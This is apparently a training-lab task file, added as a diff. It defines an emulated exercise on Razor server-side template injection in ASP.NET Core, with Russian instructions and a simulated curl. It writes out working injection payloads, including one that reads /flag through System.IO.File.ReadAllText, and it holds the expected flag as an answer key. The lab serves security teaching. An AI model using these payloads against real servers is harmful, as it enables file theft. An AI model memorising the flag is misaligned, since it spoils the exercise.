@@ -1,0 +1,41 @@
+{
+  "id": "web-razor",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{r4z0r_csh4rp_1nj3ct10n}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Razor SSTI\n\nЭндпоинт /render компилирует tpl как Razor. Дойди до чтения файла.\n\n1. Подтверди движок:\n   curl -s 'https://app.target/render?tpl=%40%287*7%29'\n2. Прочитай флаг через System.IO.File:\n   curl -s 'https://app.target/render?tpl=%40%28System.IO.File.ReadAllText(%22%2Fflag%22%29%29'\n3. Запиши флаг в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "ASP.NET Core 7.0, Razor runtime compilation включена.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/render)",
+      "cases": [
+        {
+          "match": "%40%287\\*7|@\\(7\\*7",
+          "example": "-s '.../render?tpl=@(7*7)'",
+          "output": "49\n"
+        },
+        {
+          "match": "ReadAllText|System\\.IO|File",
+          "example": "-s '.../render?tpl=@(System.IO.File.ReadAllText(\"/flag\"))'",
+          "output": "nto{r4z0r_csh4rp_1nj3ct10n}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /render на app.target.\n"
+    }
+  }
+}
